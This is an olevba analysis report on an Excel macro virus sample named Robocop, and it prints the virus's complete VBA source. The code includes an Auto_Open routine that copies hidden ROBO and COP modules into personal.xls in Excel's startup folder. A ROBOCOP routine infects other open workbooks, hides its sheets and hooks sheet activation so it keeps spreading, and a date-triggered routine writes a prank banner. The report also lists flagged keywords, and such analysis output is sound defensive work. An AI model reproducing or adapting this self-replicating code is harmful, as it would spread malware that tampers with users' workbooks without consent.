olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Robocop-820276b1313e78cde325038886c114ac17a053b7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSExcel.Robocop-820276b1313e78cde325038886c114ac17a053b7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSExcel.Robocop-820276b1313e78cde325038886c114ac17a053b7 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ROBOCOP()
    gp = 0
    vp = 0
    
    Set a = Application.ActiveWorkbook
    
    Application.ScreenUpdating = False
    For x = 1 To Application.Workbooks.Count
        If Application.Workbooks(x).Name = a.Name Then
            gp = 1
            For y = 1 To Application.Workbooks(a.Name).Modules.Count
            If Application.Workbooks(a.Name).Modules(y).Name = "ROBO" Then
                vp = 1
            End If
        Next
        
        If vp = 0 Then
            Windows(a.Name).Visible = True
            
            ActiveWorkbook.Modules.Add
            Application.Workbooks("personal.xls").Modules("ROBO").Copy _
            after:=ActiveWorkbook.Modules(1)
               
            ActiveWorkbook.Modules.Add
            Application.Workbooks("personal.xls").Modules("COP").Copy _
            after:=ActiveWorkbook.Modules(2)
            
            Application.DisplayAlerts = False
            Sheets("Modul1").Select
            ActiveWindow.SelectedSheets.Delete
            
            Sheets("Modul2").Select
            ActiveWindow.SelectedSheets.Delete
            Application.DisplayAlerts = True
            
            Sheets("COP").Select
            ActiveWindow.SelectedSheets.Visible = False
            
            Sheets("ROBO").Select
            ActiveWindow.SelectedSheets.Visible = False
            
            Windows(a.Name).Visible = True
            Application.ActiveWorkbook.Save
        End If
        End If
    Next
    
    Application.ScreenUpdating = True
    Application.Workbooks(a.Name).Save
End Sub

*****************************************************************************
                           END OF MACRO "ROBOCOP"
*****************************************************************************

Macroname: Auto_Open
~~~~~~~~~~~~~~~~~~~~
Sub Auto_Open()
Dim v%, p%
    
    gp = 0
    vp = 0
   
    Application.ScreenUpdating = False
    For x = 1 To Application.Workbooks.Count
        If Application.Workbooks(x).Name = "personal.xls" Then
            gp = 1
            For y = 1 To Application.Workbooks("personal.xls").Modules.Count
            If Application.Workbooks("personal.xls").Modules(y).Name = "ROBO" Then
                vp = 1
            End If
        Next
        
        If vp = 0 Then
            Windows("personal.xls").Visible = True
            Set a = Application.ActiveWorkbook
            Application.Workbooks(a.Name).Modules("ROBO").Copy after:=Application.Workbooks("personal.xls").Modules(1)
            Application.Workbooks(a.Name).Modules("COP").Copy after:=Application.Workbooks("personal.xls").Modules(1)
            
            Sheets("COP").Select
            ActiveWindow.SelectedSheets.Visible = False
            
            Sheets("ROBO").Select
            ActiveWindow.SelectedSheets.Visible = False
            
            Windows("personal.xls").Visible = False
            Application.OnSheetActivate = ActiveWorkbook.Name & "!COP.ROBOCOP"
            Application.Workbooks("personal.xls").Save
        End If
        End If
    Next
        If gp = 0 Then
        Set a = Application.ActiveWorkbook
        Application.Workbooks(a.Name).SaveCopyAs Application.StartupPath + "\personal.xls"
        Application.Workbooks.Open (Application.StartupPath + "\personal.xls")
        Windows("personal.xls").Visible = False
        Application.Workbooks("personal.xls").Save
        End If
    Application.ScreenUpdating = True
    
'nice harmless Payload.

d = Day(v)
m = Month(p)
If d = 30 And m = 12 Then
    Selection.RowHeight = 100
    Selection.ColumnWidth = 255
    Range("A3").Select
    With Selection.Font
        .Name = "Imprint MT Shadow"
        .Size = 24
        .StrikeThrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    Range("A3").Select
    ActiveCell.FormulaR1C1 = "ROBOCOP Nightmare Joker [SLAM]"
    With ActiveCell.Characters(Start:=1, Length:=8).Font
        .Name = "Imprint MT Shadow"
        .FontStyle = "Standard"
        .Size = 48
        .StrikeThrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    With ActiveCell.Characters(Start:=9, Length:=22).Font
        .Name = "Imprint MT Shadow"
        .FontStyle = "Standard"
        .Size = 20
        .StrikeThrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    Range("A2").Select
Else
    '...
End If

Application.OnSheetActivate = Workbooks("personal.xls").Name & "!COP.ROBOCOP"
    
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

